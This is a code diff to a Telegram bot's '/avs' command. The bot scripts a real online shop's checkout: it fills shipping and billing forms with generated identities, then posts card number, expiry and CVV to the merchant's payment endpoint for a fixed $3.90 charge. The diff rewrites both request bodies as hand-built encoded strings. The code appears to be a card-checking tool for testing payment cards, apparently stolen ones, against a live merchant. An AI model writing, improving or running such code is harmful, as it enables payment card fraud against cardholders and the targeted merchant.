@@ -109,30 +109,8 @@ bot.onText(/\/avs (.+)/, async (msg, match) => {
             }
         });
 
-        // 4. CHECKOUT INFO POST
-        const infoData = new URLSearchParams({
-            'shipping[country]': 'US',
-            'shipping[US][firstName]': rfname,
-            'shipping[US][lastName]': rlname,
-            'shipping[US][company]': '',
-            'shipping[US][phone]': rphone,
-            'shipping[US][address1]': raddrInfo.addr,
-            'shipping[US][address2]': '',
-            'shipping[US][city]': raddrInfo.city,
-            'shipping[US][state]': raddrInfo.state,
-            'shipping[US][zipcode]': raddrInfo.zip,
-            'billing[sameAsShipping]': '1',
-            'billing[country]': 'US',
-            'billing[US][firstName]': '',
-            'billing[US][lastName]': '',
-            'billing[US][company]': '',
-            'billing[US][phone]': '',
-            'billing[US][address1]': '',
-            'billing[US][address2]': '',
-            'billing[US][city]': '',
-            'billing[US][state]': raddrInfo.state,
-            'billing[US][zipcode]': ''
-        }).toString();
+        // 4. CHECKOUT INFO POST (Eksaktong gayak ng PHP raw string payload)
+        const infoData = `shipping%5Bcountry%5D=US&shipping%5BUS%5D%5BfirstName%5D=${encodeURIComponent(rfname)}&shipping%5BUS%5D%5BlastName%5D=${encodeURIComponent(rlname)}&shipping%5BUS%5D%5Bcompany%5D=&shipping%5BUS%5D%5Bphone%5D=${rphone}&shipping%5BUS%5D%5Baddress1%5D=${encodeURIComponent(raddrInfo.addr)}&shipping%5BUS%5D%5Baddress2%5D=&shipping%5BUS%5D%5Bcity%5D=${encodeURIComponent(raddrInfo.city)}&shipping%5BUS%5D%5Bstate%5D=${raddrInfo.state}&shipping%5BUS%5D%5Bzipcode%5D=${raddrInfo.zip}&shipping%5BCA%5D%5BfirstName%5D=&shipping%5BCA%5D%5BlastName%5D=&shipping%5BCA%5D%5Bcompany%5D=&shipping%5BCA%5D%5Bphone%5D=&shipping%5BCA%5D%5Baddress1%5D=&shipping%5BCA%5D%5Baddress2%5D=&shipping%5BCA%5D%5Bcity%5D=&shipping%5BCA%5D%5Bstate%5D=ON&shipping%5BCA%5D%5Bzipcode%5D=&shipping%5BGU%5D%5BfirstName%5D=&shipping%5BGU%5D%5BlastName%5D=&shipping%5BGU%5D%5Bcompany%5D=&shipping%5BGU%5D%5Bphone%5D=&shipping%5BGU%5D%5Baddress1%5D=&shipping%5BGU%5D%5Baddress2%5D=&shipping%5BGU%5D%5Bcity%5D=&shipping%5BGU%5D%5Bstate%5D=GU&shipping%5BGU%5D%5Bzipcode%5D=&shipping%5BPR%5D%5BfirstName%5D=&shipping%5BPR%5D%5BlastName%5D=&shipping%5BPR%5D%5Bcompany%5D=&shipping%5BPR%5D%5Bphone%5D=&shipping%5BPR%5D%5Baddress1%5D=&shipping%5BPR%5D%5Baddress2%5D=&shipping%5BPR%5D%5Bcity%5D=&shipping%5BPR%5D%5Bstate%5D=PR&shipping%5BPR%5D%5Bzipcode%5D=&shipping%5BMX%5D%5BfirstName%5D=&shipping%5BMX%5D%5BlastName%5D=&shipping%5BMX%5D%5Bcompany%5D=&shipping%5BMX%5D%5Bphone%5D=&shipping%5BMX%5D%5Baddress1%5D=&shipping%5BMX%5D%5Baddress2%5D=&shipping%5BMX%5D%5Bcity%5D=&shipping%5BMX%5D%5Bstate%5D=AG&shipping%5BMX%5D%5Bzipcode%5D=&shipping%5BAU%5D%5BfirstName%5D=&shipping%5BAU%5D%5BlastName%5D=&shipping%5BAU%5D%5Bcompany%5D=&shipping%5BAU%5D%5Bphone%5D=&shipping%5BAU%5D%5Baddress1%5D=&shipping%5BAU%5D%5Baddress2%5D=&shipping%5BAU%5D%5Bcity%5D=&shipping%5BAU%5D%5Bstate%5D=&shipping%5BAU%5D%5Bzipcode%5D=&shipping%5BNZ%5D%5BfirstName%5D=&shipping%5BNZ%5D%5BlastName%5D=&shipping%5BNZ%5D%5Bcompany%5D=&shipping%5BNZ%5D%5Bphone%5D=&shipping%5BNZ%5D%5Baddress1%5D=&shipping%5BNZ%5D%5Baddress2%5D=&shipping%5BNZ%5D%5Bcity%5D=&shipping%5BNZ%5D%5Bzipcode%5D=&shipping%5BPH%5D%5BfirstName%5D=&shipping%5BPH%5D%5BlastName%5D=&shipping%5BPH%5D%5Bcompany%5D=&shipping%5BPH%5D%5Bphone%5D=&shipping%5BPH%5D%5Baddress1%5D=&shipping%5BPH%5D%5Baddress2%5D=&shipping%5BPH%5D%5Bcity%5D=&shipping%5BPH%5D%5Bzipcode%5D=&shipping%5BPH%5D%5Bstate%5D=&shipping%5BHK%5D%5BfirstName%5D=&shipping%5BHK%5D%5BlastName%5D=&shipping%5BHK%5D%5Bcompany%5D=&shipping%5BHK%5D%5Bphone%5D=&shipping%5BHK%5D%5Baddress2%5D=&shipping%5BHK%5D%5Baddress1%5D=&shipping%5BHK%5D%5Bcity%5D=&billing%5BsameAsShipping%5D=1&billing%5Bcountry%5D=US&billing%5BUS%5D%5BfirstName%5D=&billing%5BUS%5D%5BlastName%5D=&billing%5BUS%5D%5Bcompany%5D=&billing%5BUS%5D%5Bphone%5D=&billing%5BUS%5D%5Baddress1%5D=&billing%5BUS%5D%5Baddress2%5D=&billing%5BUS%5D%5Bcity%5D=&billing%5BUS%5D%5Bstate%5D=${raddrInfo.state}&billing%5BUS%5D%5Bzipcode%5D=&billing%5BCA%5D%5BfirstName%5D=&billing%5BCA%5D%5BlastName%5D=&billing%5BCA%5D%5Bcompany%5D=&billing%5BCA%5D%5Bphone%5D=&billing%5BCA%5D%5Baddress1%5D=&billing%5BCA%5D%5Baddress2%5D=&billing%5BCA%5D%5Bcity%5D=&billing%5BCA%5D%5Bstate%5D=ON&billing%5BCA%5D%5Bzipcode%5D=&billing%5BGU%5D%5BfirstName%5D=&billing%5BGU%5D%5BlastName%5D=&billing%5BGU%5D%5Bcompany%5D=&billing%5BGU%5D%5Bphone%5D=&billing%5BGU%5D%5Baddress1%5D=&billing%5BGU%5D%5Baddress2%5D=&billing%5BGU%5D%5Bcity%5D=&billing%5BGU%5D%5Bstate%5D=GU&billing%5BGU%5D%5Bzipcode%5D=&billing%5BPR%5D%5BfirstName%5D=&billing%5BPR%5D%5BlastName%5D=&billing%5BPR%5D%5Bcompany%5D=&billing%5BPR%5D%5Bphone%5D=&billing%5BPR%5D%5Baddress1%5D=&billing%5BPR%5D%5Baddress2%5D=&billing%5BPR%5D%5Bcity%5D=&billing%5BPR%5D%5Bstate%5D=PR&billing%5BPR%5D%5Bzipcode%5D=&billing%5BMX%5D%5BfirstName%5D=&billing%5BMX%5D%5BlastName%5D=&billing%5BMX%5D%5Bcompany%5D=&billing%5BMX%5D%5Bphone%5D=&billing%5BMX%5D%5Baddress1%5D=&billing%5BMX%5D%5Baddress2%5D=&billing%5BMX%5D%5Bcity%5D=&billing%5BMX%5D%5Bstate%5D=AG&billing%5BMX%5D%5Bzipcode%5D=&billing%5BAU%5D%5BfirstName%5D=&billing%5BAU%5D%5BlastName%5D=&billing%5BAU%5D%5Bcompany%5D=&billing%5BAU%5D%5Bphone%5D=&billing%5BAU%5D%5Baddress1%5D=&billing%5BAU%5D%5Baddress2%5D=&billing%5BAU%5D%5Bcity%5D=&billing%5BAU%5D%5Bstate%5D=&billing%5BAU%5D%5Bzipcode%5D=&billing%5BNZ%5D%5BfirstName%5D=&billing%5BNZ%5D%5BlastName%5D=&billing%5BNZ%5D%5Bcompany%5D=&billing%5BNZ%5D%5Bphone%5D=&billing%5BNZ%5D%5Baddress1%5D=&billing%5BNZ%5D%5Baddress2%5D=&billing%5BNZ%5D%5Bcity%5D=&billing%5BNZ%5D%5Bzipcode%5D=&billing%5BPH%5D%5BfirstName%5D=&billing%5BPH%5D%5BlastName%5D=&billing%5BPH%5D%5Bcompany%5D=&billing%5BPH%5D%5Bphone%5D=&billing%5BPH%5D%5Baddress1%5D=&billing%5BPH%5D%5Baddress2%5D=&billing%5BPH%5D%5Bcity%5D=&billing%5BPH%5D%5Bzipcode%5D=&billing%5BPH%5D%5Bstate%5D=&billing%5BHK%5D%5BfirstName%5D=&billing%5BHK%5D%5BlastName%5D=&billing%5BHK%5D%5Bcompany%5D=&billing%5BHK%5D%5Bphone%5D=&billing%5BHK%5D%5Baddress2%5D=&billing%5BHK%5D%5Baddress1%5D=&billing%5BHK%5D%5Bcity%5D=`;
 
         await client.post('https://fireflyfuel.com/checkout/info', infoData, {
             headers: {
@@ -159,31 +137,7 @@ bot.onText(/\/avs (.+)/, async (msg, match) => {
         });
 
         // 6. RUN PAYMENT AJAX
-        const paymentData = new URLSearchParams({
-            'x_amount': '3.90',
-            'x_order_id': '',
-            'x_cust_id': '',
-            'x_first_name': rfname,
-            'x_last_name': rlname,
-            'x_address': raddrInfo.addr,
-            'x_city': raddrInfo.city,
-            'x_state': raddrInfo.state,
-            'x_zip': raddrInfo.zip,
-            'x_phone': rphone,
-            'x_email': remail,
-            'x_country': 'US',
-            'x_ship_to_first_name': rfname,
-            'x_ship_to_last_name': rlname,
-            'x_ship_to_address': raddrInfo.addr,
-            'x_ship_to_city': raddrInfo.city,
-            'x_ship_to_state': raddrInfo.state,
-            'x_ship_to_zip': raddrInfo.zip,
-            'x_ship_to_phone': rphone,
-            'x_ship_to_country': 'US',
-            'x_card_num': cc,
-            'x_exp_date': `${mes}${ano}`,
-            'x_card_code': cvv1
-        }).toString();
+        const paymentData = `x_amount=3.90&x_order_id=&x_cust_id=&x_first_name=${encodeURIComponent(rfname)}&x_last_name=${encodeURIComponent(rlname)}&x_address=${encodeURIComponent(raddrInfo.addr)}&x_city=${encodeURIComponent(raddrInfo.city)}&x_state=${raddrInfo.state}&x_zip=${raddrInfo.zip}&x_phone=${rphone}&x_email=${encodeURIComponent(remail)}&x_country=US&x_ship_to_first_name=${encodeURIComponent(rfname)}&x_ship_to_last_name=${encodeURIComponent(rlname)}&x_ship_to_address=${encodeURIComponent(raddrInfo.addr)}&x_ship_to_city=${encodeURIComponent(raddrInfo.city)}&x_ship_to_state=${raddrInfo.state}&x_ship_to_zip=${raddrInfo.zip}&x_ship_to_phone=${rphone}&x_ship_to_country=US&x_card_num=${cc}&x_exp_date=${mes}${ano}&x_card_code=${cvv1}`;
 
         const payRes = await client.post('https://fireflyfuel.com/checkout/run-payment.ajax', paymentData, {
             headers: {
